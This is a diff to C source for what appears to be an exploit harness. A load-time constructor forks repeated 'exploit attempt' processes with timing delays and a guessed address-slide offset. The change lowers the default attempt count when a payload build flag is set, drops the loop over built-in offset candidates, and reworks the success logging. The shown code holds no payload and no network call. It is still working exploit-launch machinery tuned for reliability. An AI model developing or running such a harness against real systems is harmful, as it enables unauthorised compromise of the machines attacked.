@@ -1,15 +1,15 @@
 #include "common.h"
 
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+#define DEFAULT_EXPLOIT_ATTEMPTS 3
+#else
 #define DEFAULT_EXPLOIT_ATTEMPTS 16
+#endif
 #define DEFAULT_PSELECT_DELAY_USEC 20000
 #define DEFAULT_ATTEMPT_TIMEOUT_SEC 90
 #define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 20
 
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
-static const uintptr_t app_slide_p0_offsets[] = {
-  SLIDE_P0_OFFSET_CANDIDATES
-};
-
 struct app_p0_shared_state {
   atomic_int ready;
   _Atomic uintptr_t offset;
@@ -61,12 +61,6 @@ __attribute__((constructor)) static void load(void) {
 
   int max_attempts = env_int(
       "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
-#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
-  if (!getenv("EXPLOIT_ATTEMPTS") && !getenv("SLIDE_P0_OFFSET")) {
-    max_attempts =
-        (int)(sizeof(app_slide_p0_offsets) / sizeof(app_slide_p0_offsets[0]));
-  }
-#endif
   int base_delay = env_int(
       "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
   int attempt_timeout_sec = env_int(
@@ -100,15 +94,6 @@ __attribute__((constructor)) static void load(void) {
 
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     int delay_usec = attempt_delay_usec(base_delay, attempt);
-#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
-    uintptr_t app_attempt_offset = 0;
-    if (!getenv("SLIDE_P0_OFFSET")) {
-      size_t candidate_index =
-          (size_t)(attempt - 1) %
-          (sizeof(app_slide_p0_offsets) / sizeof(app_slide_p0_offsets[0]));
-      app_attempt_offset = app_slide_p0_offsets[candidate_index];
-    }
-#endif
     pid_t child = SYSCHK(fork());
     if (child == 0) {
       SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
@@ -119,14 +104,15 @@ __attribute__((constructor)) static void load(void) {
       snprintf(delay, sizeof(delay), "%d", delay_usec);
       SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
-      if (!getenv("SLIDE_P0_OFFSET")) {
-        char offset_arg[16];
-        snprintf(offset_arg, sizeof(offset_arg), "0x%zx", app_attempt_offset);
-        SYSCHK(setenv("SLIDE_P0_OFFSET", offset_arg, 1));
+      const char *forced_offset = getenv("SLIDE_P0_OFFSET");
+      if (forced_offset) {
+        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=%s\n",
+                   attempt, max_attempts, getpid(), delay_usec,
+                   forced_offset);
+      } else {
+        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=scan\n",
+                   attempt, max_attempts, getpid(), delay_usec);
       }
-      pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=%s\n",
-                 attempt, max_attempts, getpid(), delay_usec,
-                 getenv("SLIDE_P0_OFFSET"));
 #else
       pr_success("exploit attempt=%d/%d pid=%d delay=%d\n",
                  attempt, max_attempts, getpid(), delay_usec);
